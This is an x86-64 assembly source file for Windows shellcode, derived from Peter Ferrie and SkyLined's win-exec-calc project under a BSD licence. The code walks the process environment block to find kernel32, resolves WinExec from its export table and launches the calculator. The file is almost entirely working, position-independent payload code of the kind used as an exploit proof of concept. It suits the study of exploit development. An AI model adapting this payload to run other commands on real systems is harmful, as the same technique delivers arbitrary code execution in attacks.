;; Code derived from Peter Ferrie <peter.ferrie@gmail.com>
;; see:
;; https://github.com/peterferrie/win-exec-calc-shellcode
;; for a better explanation of the code

;; As the Copyright message below:

;; Copyright (c) 2009-2014 Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
;; and Peter Ferrie <peter.ferrie@gmail.com>
;; All rights reserved.
;; 
;; Redistribution and use in source and binary forms, with or without
;; modification, are permitted provided that the following conditions are met:
;;     * Redistributions of source code must retain the above copyright
;;       notice, this list of conditions and the following disclaimer.
;;     * Redistributions in binary form must reproduce the above copyright
;;       notice, this list of conditions and the following disclaimer in the
;;       documentation and/or other materials provided with the distribution.
;;     * Neither the name of the copyright holder nor the names of the
;;       contributors may be used to endorse or promote products derived from
;;       this software without specific prior written permission.
;; 
;; THIS SOFTWARE IS PROVIDED ''AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
;; INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
;; AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
;; COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
;; INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
;; NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
;; DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
;; THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
;; (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
;; SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

	BITS	64		

	SECTION .text
	
_start:
	push	rbp		
	sub	rsp, 0x40			; make a stack frame
	mov	rsi, gs:[0x60]			; get PEB address
	mov	rsi, [rsi + 0x18] 		; get PEB_LDR_DATA address
	mov	rsi, [rsi + 0x10]		; get LDR_MODULE
	mov	rsi, [rsi]			; find kernel.dll
	mov	rsi, [rsi]
	mov	rdi, [rsi + 0x30] 		; get Kernel dll Base
	xor	rdx, rdx 
	mov	rdx, 0x60
	add	edx, [rdi + 0x3c] 		; Parse PE header
	mov	ebx, [dword rdi + rdx + 0x28]	 
	mov	esi, dword [rdi + rbx + 0x20] 	; address of names table
	add	rsi, rdi
	mov	edx, dword [rdi + rbx + 0x24] 	; ordinals table
findexec:
	movzx	ebp, word [rdi + rdx] 		; Looping until find 'WinExec' string
	lea	edx, [rdx + 0x2]
	lodsd
	mov	r8, 'WinExec'
	cmp	qword [rdi + rax], r8
	jne	findexec
	
	mov	esi, dword [rdi + rbx + 0x1c]
	add	rsi, rdi
	mov	esi, dword [rsi + rbp * 0x4]
	add	rdi, rsi			; WinExec address
	cdq
	lea	rcx, qword [rel calcstr] 	; rcx points to string 'calc'
	mov	rdx, 0x5
	call	rdi				; call WinExec
	add	rsp, 40h			; free the stack frame and return
	pop	rbp
	ret
calcstr	db	'calc',0,0,0,0
